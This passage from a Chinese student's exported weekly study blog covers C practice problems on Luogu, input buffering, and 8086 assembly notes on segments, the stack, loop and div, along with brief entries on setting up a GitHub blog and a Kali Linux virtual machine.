&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,name);</span><br><span class="line">		getchar();</span><br><span class="line">			<span class="keyword">while</span>(p1-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(name,p1-&gt;name)!=<span class="number">0</span>)&#123;</span><br><span class="line">				p1=p1-&gt;next;</span><br><span class="line">				num++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,num);</span><br><span class="line">				flag=<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;not found\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;type a number:   &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">		<span class="keyword">while</span>(i!=num&amp;&amp;p1-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			p1=p1-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(p1-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;wrong number&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,p1-&gt;name);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最开始写的时候把num和name[10]放在一个共用体里，没考虑到共用体里只能有一个成员有值…</p>
<h2 id="3-汇编语言学习：">3.汇编语言学习：</h2>
<h3 id="1-存储单元：">1-存储单元：</h3>
<pre><code>bit（一个二进制位），8位bit，8个bit组成一个byte（字节）
</code></pre>
<h3 id="2-cpu对存储器的读写：">2-cpu对存储器的读写：</h3>
<p>和外部器件进行三类信息交互：</p>
<pre><code>	1.存储单元的地址（地址信息）；
	2.器件的选择，读或写（控制信息）；
	3.读或写的数据（数据信息）；
cpu通过总线传输信息，总线分为：地址，， 控制，， 数据，，
一个cpu有n根地址线，可一次传送n位二进制数据，地址总线宽度为n，
这样的cpu 最多可以对2^n个内存单元进行寻址
控制总线  ：“读信号输出”	“写信号输出”
</code></pre>
<p>存储器芯片：</p>
<pre><code>读写属性：随机存储器（ram）只读存储器（rom）
功能和连接：
	随机存储器，存放供cpu使用的绝大部分程序和数据
	接口卡上的ram，如显存
	装有bios的rom（在主板和各类接口卡上，如显卡，网卡）
</code></pre>
<p>内存地址空间：<br>
内存地址空间地址段分配<br>
基于硬件系统编程必须知道这个系统中的内存地址空间分配情况，想在某类存储器中读写数据的时候必须知道它的第一个单元的地址和最后一个单元的地址<br>
<img src="https://img-blog.csdnimg.cn/20191205180311107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="3-汇编指令：">3-汇编指令：</h3>
<p>不区分大小写</p>
<p>mov ah,78		==		将18送入寄存器ax<br>
mov ax,bx 		==		将寄存器bx中的数据送入寄存器ax<br>
add ax,bx		==		将ax和bx中的数值相加，结果存在ax中</p>
<p>ax中数值为00C5H，执行add al，93H 后，ax中数据为：0058H，不为0058H，因为此时al是作为一个独立的8位寄存器，与ah没有关系。</p>
<p>8086cpu<br>
16位结构（16位机、字长为16位）：<br>
1.运算器一次最多可以处理16位的数据<br>
2.寄存器的最大宽度为16位<br>
3.运算器和寄存器之间的通路为16位</p>
<p>两个16位地址（段地址、偏移地址）合成一个20位物理地址<br>
段地址和偏移地址通过内部总线送入地址加法器，合成后通过内部总线–&gt;输入输出控制电路–&gt;地址总线–&gt;存储器<br>
地址加法器中，物理地址=段地址 *16+偏移地址<br>
（段地址 *16表现为16进制时向左移一位，2进制时移动4位）<br>
（一个x进制的数据向左移动n位，相当于乘以x^n)</p>
<p>内存没有分段，段的划分来自于cpu，cpu可以用不同段地址和偏移地址形成同一个物理地址<br>
对于8086pc机，“数据在21F60H内存单元中”=“数据存在内存2000：1F60单元中”=“数据存在内存的2000H段中的1F60H单元中”</p>
<h3 id="4-段寄存器（segment-register）">4.-段寄存器（segment register）</h3>
<p>提供段地址<br>
6个段寄存器：<br>
cs（code）<br>
ds（data）<br>
ss（stack）<br>
es（extra）<br>
*32位：fs（flag）gs（global）</p>
<h3 id="5-CS、IP">5-CS、IP</h3>
<p>cs为代码段寄存器，IP为指令指针寄存器<br>
物理地址=CS *16+IP</p>
<p>cpu读取指令后，指令进入指令缓冲器，IP的值自动增加，增加长度等于当前读入指令长度</p>
<p>cpu刚开始工作时，CS=FFFFH,IP=0000H,即从FFFF0H单元读取指令执行。<br>
改变CS、IP的值的指令统称为转移指令，如jmp<br>
同时修改CS、IP:jmp 段地址:偏移地址<br>
只修改IP:jmp 某一合法寄存器（如ax/bx）在含义上好似： mov IP,ax</p>
<h3 id="6-字单元：">6-字单元：</h3>
<p>存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成，高地址内存单元中存放字型数据的高位字节，，，，，<br>
起始地址为n的字单元简称为n地址字单元</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.01.12-2020.01.18</title>
    <url>/19661.html</url>
    <content><![CDATA[<h1>2020.1.12-2020.1.18</h1>
<hr>
<h3 id="1-scanf、getchar、getch、getche和缓冲区">1.scanf、getchar、getch、getche和缓冲区</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xMzU0OTgz">https://cloud.tencent.com/developer/article/1354983<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGFuaGFpY29kZS9wLzEwNTc1MDQ5Lmh0bWw=">https://www.cnblogs.com/lanhaicode/p/10575049.html<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>读取字符时：<br>
(1)scanf()以 Enter 结束一次输入，不会舍弃最后的回车符（即回车符会残留在缓冲区中）；<br>
(2)getchar()以 Enter 结束输入，不会舍弃最后的回车符。<br>
读取字符串时：<br>
(1) scanf()以Space、Enter、Tab结束一次输入，不会舍弃最后的回车符；<br>
(2) gets()以Enter结束输入（空格不结束），接受空格，会舍弃最后的回车符！<br>
所以读取一个字符串中的每一个字符的时候，往往使用getchar()而不使用scanf()，因为一个字符串中是会出现空格的。如果使用scanf()会造成将一个字符串首先读入第一个空格前的部分，其余部分会残留在输入缓冲区的情况，在下次读取时可能会出现错误。<br>
其次为了避免出现上述问题，必须要在读取输入前，清空缓冲区的残留数据</p>
</blockquote>
<span id="more"></span>
<p>缓冲区是一块内存空间，用来缓存数据，目的是让快速的cpu不必等待慢速的输入输出设备，同时减少操作硬件的次数</p>
<p>根据数据刷新的时机可将缓冲区类型分为<br>
1.全缓冲：当缓冲区被填满以后才进行真正的输入输出操作<br>
2.行缓冲：当输入或输出时遇到换行符时才进行真正的输入输出操作<br>
3.无缓冲：没有缓冲区，立即进行输入输出</p>
<p>Windows下c语言的printf是无缓冲的</p>
<h3 id="2-洛谷">2.洛谷</h3>
<h5 id="1-P1597-语句解析">1.P1597-语句解析</h5>
<p><img src="https://img-blog.csdnimg.cn/20200117224034766.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
没有啥思路就看题解了<br>
因为scanf成功读入一个返回值为1，读入两个返回值为2，可以此作为循环条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">char</span> c1,c2;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%c:=%c;&quot;</span>,&amp;c1,&amp;c2)==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(c2&gt;<span class="string">&#x27;0&#x27;</span>&amp;&amp;c2&lt;<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">			a[c1-<span class="string">&#x27;a&#x27;</span>]=c2-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			a[c1-<span class="string">&#x27;a&#x27;</span>]=a[c2-<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a[<span class="number">0</span>],a[<span class="number">1</span>],a[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">//	char a=14;</span></span><br><span class="line"><span class="comment">//	int b;</span></span><br><span class="line"><span class="comment">//	b=a;</span></span><br><span class="line"><span class="comment">//	printf(&quot;%d&quot;,b);</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-P1739-表达式括号匹配">2.P1739-表达式括号匹配</h5>
<p><img src="https://img-blog.csdnimg.cn/20200117223137978.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
第一次提交了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> b;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">			i++;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">			j++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(j==i)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>没考虑到右括号在左括号旁边的情况 如：)(a+1)*(a+2)(@<br>
看了一下题解：<br>
<strong>每出现一个左括号+1，每出现一个右括号且该变量大于0时-1.最后整个字符串判断完之后如果这个变量值为0则原表达式是匹配的。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">			i++;</span><br><span class="line">			c++;</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">			j++;</span><br><span class="line">			<span class="keyword">if</span>(c&gt;<span class="number">0</span>)</span><br><span class="line">				c--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(j==i&amp;&amp;c==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>通过了</p>
<h3 id="3-汇编语言学习">3.汇编语言学习</h3>
<h6 id="栈段">栈段</h6>
<p>栈顶的变化范围是0~ffff，栈空时sp=0，栈满时sp也=0，一个栈容量最大为64kb<br>
执行修改栈段寄存器ss的指令时，下一条指令也紧接着被执行<br>
如 用t命令执行 mov ss，ax时，下一条mov sp，10也紧接着执行了</p>
<h6 id="一个源程序从写出到执行的过程">一个源程序从写出到执行的过程</h6>
<ol>
<li>编写汇编源程序，产生了一个存储源程序的文本文件</li>
<li>用汇编语言编译程序编译源程序，产生目标文件，再用连接程序对目标文件进行连接，生成可执行文件<br>
可执行文件包1.含程序（机器码）和数据，2.相关描述信息，如程序有多大，要占用多少内存空间等</li>
<li>执行可执行文件中的程序</li>
</ol>
<h6 id="源程序">源程序</h6>
<p>例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"> codesg segment</span><br><span class="line"> 	mov ax,0123</span><br><span class="line"> 	mov bx,0456</span><br><span class="line"> 	add ax,bx</span><br><span class="line"> 	add ax,ax</span><br><span class="line"> 	</span><br><span class="line"> 	mov ax,4c00</span><br><span class="line"> 	int 21</span><br><span class="line"> 	</span><br><span class="line"> codesg ends</span><br><span class="line"> end</span><br></pre></td></tr></table></figure>
<ol>
<li>伪指令<br>
1。<code>xxx segment\n····\nxxx ends</code><br>
是必须使用到的一对伪指令，功能是定义一个段，xxx是段名<br>
一个汇编程序是由多个段组成的，这些段被用来存放代码/数据/当作栈空间用<br>
一个汇编程序中至少要有一个段用来存放代码<br>
段名（xxx）最终将被处理为一个段的段地址<br>
2。<code>end</code><br>
是一个汇编程序的结束标记<br>
3。<code>assume</code><br>
假设某一段寄存器和程序中的某一个用 segment…ends定义的段相关联，如例中段codesg和cpu中的段寄存器cs联系起来</li>
</ol>
<h6 id="bx-和loop指令">[bx]和loop指令</h6>
<ol>
<li>[bx]<br>
要完整地描述一个内存单元，需要两种信息：1。内存单元的地址；2.内存单元的长度（类型）（有多大）<br>
mov al（ax）,[bx]   ：<br>
将一个内存单元的内容送入al（ax），这个内存单元的长度为1（2）字节，存放一个字节（一个字），偏移地址在bx中，段地址在ds中。</li>
<li>loop<br>
用loop指令实现循环功能，cx中存放循环次数<br>
执行loop指令的时候，1.（cx）=（cx)-1 ; 2.判断（cx），不为零则转至标号处执行程序，如果为零则向下执行<br>
``  例：计算2^12</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment </span><br><span class="line">	mov ax,2</span><br><span class="line">	</span><br><span class="line">	mov cx,11</span><br><span class="line">s:	add ax,ax</span><br><span class="line">	loop s</span><br><span class="line">	</span><br><span class="line">	mov ax,4c00h</span><br><span class="line">	int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2019.12.08-2019.12.14</title>
    <url>/2598.html</url>
    <content><![CDATA[<h1>2019.12.08~2019.12.14学习报告</h1>
<hr>
<h2 id="1-洛谷-P1296-奶牛的耳语">1.洛谷-P1296 奶牛的耳语</h2>
<p><img src="https://img-blog.csdnimg.cn/20191214140215863.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,d;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;d);</span><br><span class="line">	<span class="keyword">int</span> a[n];</span><br><span class="line">	<span class="keyword">int</span> g=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> temp;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[j]&lt;a[i])&#123;</span><br><span class="line">				temp=a[i];</span><br><span class="line">				a[i]=a[j];</span><br><span class="line">				a[j]=temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>((a[j]-a[i])&lt;=d)&#123;</span><br><span class="line">				g++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果两个测试点超时了<br>
艳玲学姐说是冒泡的时间复杂度高，要用快排</p>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inc</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> * a,<span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> * (<span class="keyword">int</span> * )a-* (<span class="keyword">int</span> *)b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	qsort(a,n, <span class="keyword">sizeof</span>(<span class="keyword">int</span>),inc);</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<p>了解了一下快排<br>
感觉很神奇</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUFFMQzdxRmpiNzRrdDZQZEV4UDhtdw==">漫画：什么是快速排序？（完整版）<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2-汇编语言学习">2.汇编语言学习</h2>
<h3 id="ds和-address">ds和[address]</h3>
<blockquote>
<p>将1000：0中的数据读到al中：</p>
<p>mov bx,1000H<br>
mov ds,bx<br>
mov al,[0]</p>
</blockquote>
<p>[…]里表示的是偏移地址，执行第三条指令时cpu自动取ds中的数据作为内存单元的段地址</p>
<p>ds是段寄存器，不能用mov ds,1000H，只能用一个寄存器进行中转。</p>
<h3 id="mov-add-sub指令">mov add sub指令</h3>
<p>mov/sub/add 寄存器，数据<br>
mov/sub/add 寄存器，寄存器<br>
mov/sub/add 寄存器&lt;----&gt;内存单元</p>
<p>mov 段寄存器&lt;----&gt;寄存器<br>
mov 内存单元&lt;----&gt;段寄存器</p>
<p>sub和add 不能对段寄存器操作</p>
<h3 id="栈：">栈：</h3>
<p>入栈：将一个新的元素放到栈顶<br>
出栈：从栈顶取出一个元素<br>
栈顶的元素总是最后入栈，需要出栈时又最先被从栈中取出</p>
<h4 id="栈机制：">栈机制：</h4>
<p>都以字为单位进行<br>
push 入栈<br>
pop 出栈<br>
高地址单元存放高8位，低地址单元存放低8位</p>
<p>cpu如何知道某段空间被当作栈来使用？------栈顶的段地址存放在段寄存器SS中。<br>
cpu如何知道哪个单元时栈顶单元？------偏移地址存放在寄存器SP中。</p>
<p>push ax 执行时：</p>
<ol>
<li>sp=sp-2，ss：sp只想当前栈顶前面的单元，以当前栈顶前面的单元为新栈顶</li>
<li>将ax中的内容送入ss：sp指向的内存单元处</li>
</ol>
<p>栈空，ss：sp指向占空间最高地址单元的下一个单元：<br>
如果将10000H~1000FH这段空间当作栈，此时ss=1000，sp=0010</p>
<h4 id="栈顶超界：">栈顶超界：</h4>
<p>push：sp=sp-2，将栈空间外的数据覆盖<br>
pop：sp=sp+2，再push后将栈空间外的数据覆盖</p>
<h4 id="push、pop指令">push、pop指令</h4>
<ul>
<li>push：先改变sp，后向ss：sp传送</li>
<li>pop：先读取ss：sp处数据，后改变sp</li>
</ul>
<p>栈顶变化范围最大为0~FFFFH<br>
栈空：sp=0<br>
栈满：sp=0</p>
<p>pop后栈内数据不变化</p>
<h2 id="3-搭kali">3.搭kali</h2>
<p>1.下载并安装VMware Workstation pro、下载Kali Linux 64-bit VMware<br>
2.打开虚拟机<img src="https://img-blog.csdnimg.cn/2019121415301690.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
3.浏览网页的时候发现中文不能显示，就按照<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1c3RfaGsvYXJ0aWNsZS9kZXRhaWxzLzEwMzI5OTEzNg==">解决kali-2019.4中文乱码问题<i class="fa fa-external-link-alt"></i></span>解决了</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.01.19-2020.02.02</title>
    <url>/17577.html</url>
    <content><![CDATA[<h3 id="1-用github搞了博客">1.用github搞了博客</h3>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFzdC5haS8yMDIwLzAxLzE2L2Zhc3RfdGVtcGxhdGUv">https://www.fast.ai/2020/01/16/fast_template/<i class="fa fa-external-link-alt"></i></span><br>
并用了他的模板…<br>
页面还没改完</p>
<h3 id="2-汇编语言学习">2.汇编语言学习</h3>
<h5 id="BX-和loop指令">[BX]和loop指令</h5>
<p>一次执行完循环的过程：<br>
g指令：<br>
“g 0012”从当前的cs：ip指向的指令执行，一直到（ip）=0012为止<br>
p指令：<br>
直到（cx）=0为止</p>
<h5 id="段前缀：">段前缀：</h5>
<p>在访问内存单元的指令中显式低给出内存单元段地址所在的段寄存器，如：<br>
mov ax,ds:[bx]<br>
mov ax,cs:[bx]<br>
mov ax,ss,[bx]<br>
mov ax,ex,[0]<br>
…</p>
<span id="more"></span>
<h5 id="在代码段中使用数据">在代码段中使用数据</h5>
<p>code segment<br>
“dw 0123，0456”<br>
…<br>
dw的含义是定义字型数据，因为用dw定义的数据出于代码段的最开始，所以偏移地址为0，这两个数据就在代码段的偏移0，2 处，地址为cs:0,cs:2</p>
<h5 id="将数、代码、栈放入不同的段">将数、代码、栈放入不同的段</h5>
<p>一个段的容量不能大于64kb（8086模式的限制）</p>
<blockquote>
<p>assume cs:code,ds:data,ss:stack<br>
data segment<br>
dw 0123h,0456h,0789h,0abch,0defh,0cbah,0987h<br>
data ends<br>
stack segment<br>
dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>
stack ends<br>
code segment<br>
start: mov ax,==stack==<br>
mov ss,ax<br>
mov sp:20h<br>
mov ax,==data==  ;将名称为data的段的段地址送入ax（数值）<br>
mov ds,ax<br>
mov bx,0<br>
mov cx,8<br>
s:	push [bx]<br>
add bx,2<br>
loop s<br>
mov bx,0<br>
mov cx,8<br>
s0:	pop [bx]<br>
add bx,2<br>
loop s0<br>
mov ax,4c00h<br>
int 21h<br>
code ends<br>
end start</p>
</blockquote>
<h5 id="and-和-or-指令">and 和 or 指令</h5>
<p>and：按位进行与运算<br>
mov al，01100011B<br>
and al，001111011B<br>
or：按位进行或运算<br>
…<br>
or al，00111011B</p>
<h5 id="以字符形式给出的数据">以字符形式给出的数据</h5>
<p>用’…'的方式指明数据是以字符形式给出的，编译器将把它们转化为对应的ascii码<br>
db ‘unix’ 相当于 db 75h,6eh,49h,58h (ascii 码)</p>
<h5 id="bx-idata">[bx+idata]</h5>
<p>mov ax,[200+bx]==mov ax,[bx+200]==mov ax,200[bx]==mov ax,[bx].200<br>
(ax)=((ds)*16+(bx)+200)<br>
用[bx+idata]的方式进行数组的处理</p>
<h5 id="SI、DI">SI、DI</h5>
<p>是和bx功能相近的寄存器，不能够分成两个8位寄存器来使用<br>
可以使用 [bx+si+idata]和[bx+di+idata]的方式表示内存单元，不能用[si+di]</p>
<h6 id="BP">BP</h6>
<p>在8086cpu中只有 si、di、bp、bx四个寄存器能在[…]里进行内存单元的寻址<br>
四个寄存器可以单个出现或只能出现：bx+si;bx+di;bp+si;bp+di。bx+b；si+di是错的<br>
只要使用了bp而没有给出段地址，段地址就默认在ss中</p>
<h6 id="数据位置的表达">数据位置的表达</h6>
<p>1.直接用立即数idata表示：mov ax,1；mov al,‘a’<br>
2.将数据存在寄存器中<br>
3.要处理的数据在内存中，可用[…]的格式给出EA,SA在某个段寄存器中</p>
<ul>
<li>1.mov ax,[bx+si+8]中 段地址默认在ds中</li>
<li>2.mov ax,[bp+si+8]中 段地址默认在ss中</li>
<li>存放段地址的寄存器也可以显性给出：mov ax,ds:[bx+si+8]</li>
</ul>
<h6 id="指令要处理的数据的尺寸">指令要处理的数据的尺寸</h6>
<ul>
<li>1.通过寄存器名指明：ax 字，al/ah 字节</li>
<li>2.用操作符_word/byte__ptr<br>
inc word ptr [bx]<br>
add byte ptr [bx],2<br>
否则cpu无法得知要访问的单元是字单元还是字节单元</li>
<li>3.其他<br>
如push,[1000]</li>
</ul>
<h4 id="寄存器整理">寄存器整理</h4>
<h6 id="bx、si、di、bp：">bx、si、di、bp：</h6>
<p>不使用bp时段地址默认在ds中<br>
使用bp时段地址默认在ss中</p>
<h6 id="dx：累加寄存器">dx：累加寄存器</h6>
<h6 id="cs：代码">cs：代码</h6>
<h6 id="ss-sp：栈顶">ss:sp：栈顶</h6>
<h6 id="ds：数据">ds：数据</h6>
<h6 id="cx：loop">cx：loop</h6>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.03-2020.02.09</title>
    <url>/7089.html</url>
    <content><![CDATA[<p>这周学得比较少因为刚把输入法从全拼换成双拼在练习打字…</p>
<h2 id="1-搞博客">1.搞博客</h2>
<ul>
<li>在博客里加入了点效果（小声 bb：以前觉得应该挺复杂的，其实有了轮子之后也就一行代码的事啊）<br>
参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1ZpbmNlbnRHYXJyZWF1L3BhcnRpY2xlcy5qcw==">https://github.com/VincentGarreau/particles.js<i class="fa fa-external-link-alt"></i></span> -了解了 GitHub 上博客的结构<br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vRWFnbGVyeS9wLzUxMjYyNzkuaHRtbA==">使用 GitHub,Jekyll 打造自己的免费独立博客<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<span id="more"></span>
<h2 id="2-汇编语言学习">2.汇编语言学习</h2>
<h3 id="div-指令">div 指令</h3>
<ul>
<li>div 是除法指令 -除数：有 8 位和 16 位两种，在一个寄存器或内存单元中 -被除数：默认放在 ax 或 dx 和 ax 中<br>
如果除数为 8 位，则被除数为 16 位，默认放在 ax 中存放<br>
如果除数为 16 位，则被除数位 32 位，在 dx 和 ax 中存放，dx 存放高 16 位，ax 存放低 16 位 -结果：<br>
除数为 8 位（16^2-1=255)，al 储存商，ah 储存余数<br>
除数为 16 位(16^4-1=65535)，ax 储存商，dx 储存余数</li>
</ul>
<p>divbyteptrds:[0]含义：<br>
~(al)=(ax)/((ds)*16+0)的商<br>
(ah)=(ax)/((ds)*16+0)的余数</p>
<p>divwordptr[bx+si+8]含义：<br>
~(ax)=[(dx)*10000h+(ax)]/((ds)*16+(bx)+(si)+8)的商<br>
